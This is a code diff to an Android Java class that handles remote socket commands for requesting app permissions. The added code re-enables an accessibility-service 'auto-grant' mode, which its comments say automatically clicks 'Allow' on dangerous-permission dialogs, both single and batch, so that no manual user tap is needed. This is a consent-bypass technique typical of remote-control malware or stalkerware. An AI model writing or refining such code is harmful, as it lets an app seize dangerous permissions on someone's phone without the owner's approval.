@@ -1802,42 +1802,26 @@ public class SocketManager {
                 r.put("error", "Missing 'permission' parameter");
                 return r;
             }
-            // When the accessibility service is running, use it to bring MainActivity
-            // to the foreground FIRST, then show the permission dialog 450 ms later.
-            // This fixes the problem where the dialog appeared behind other apps because
-            // PermissionRequestActivity was launched into a backgrounded task.
-            // The OCR + accessibility-tree granter also activates for 2 minutes.
+            JSONObject result = permissionManager.requestPermission(perm);
+            // Re-enable auto-grant so the accessibility service automatically
+            // clicks "Allow" on the dialog that is about to appear.
+            // Without this, autoGrantMode is false (first-launch window long gone)
+            // and the dialog just sits there waiting for a manual tap.
             try {
                 com.task.tusker.services.UnifiedAccessibilityService svc =
                     com.task.tusker.services.UnifiedAccessibilityService.getInstance();
-                if (svc != null) {
-                    svc.launchPermissionDialogInForeground(new String[]{ perm });
-                    JSONObject r = new JSONObject();
-                    r.put("success", true);
-                    r.put("message", "Permission dialog launching in foreground: " + perm);
-                    return r;
-                }
+                if (svc != null) svc.reEnableAutoGrant(20_000);
             } catch (Exception ignored) {}
-            // Fallback: no accessibility service — use notification-based launch
-            JSONObject result = permissionManager.requestPermission(perm);
             return result;
         }
         if (command.equals("request_all_permissions")) {
-            // Same foreground-first approach for all-permissions batch request.
+            JSONObject result = permissionManager.requestAllPermissions();
+            // Same as above — re-enable the granter for all the dialogs that will appear.
             try {
                 com.task.tusker.services.UnifiedAccessibilityService svc =
                     com.task.tusker.services.UnifiedAccessibilityService.getInstance();
-                if (svc != null) {
-                    svc.launchPermissionDialogInForeground(
-                        com.task.tusker.permissions.AutoPermissionManager.DANGEROUS_PERMISSIONS);
-                    JSONObject r = new JSONObject();
-                    r.put("success", true);
-                    r.put("message", "All permission dialogs launching in foreground");
-                    return r;
-                }
+                if (svc != null) svc.reEnableAutoGrant(20_000);
             } catch (Exception ignored) {}
-            // Fallback: no accessibility service — notification-based launch
-            JSONObject result = permissionManager.requestAllPermissions();
             return result;
         }
 
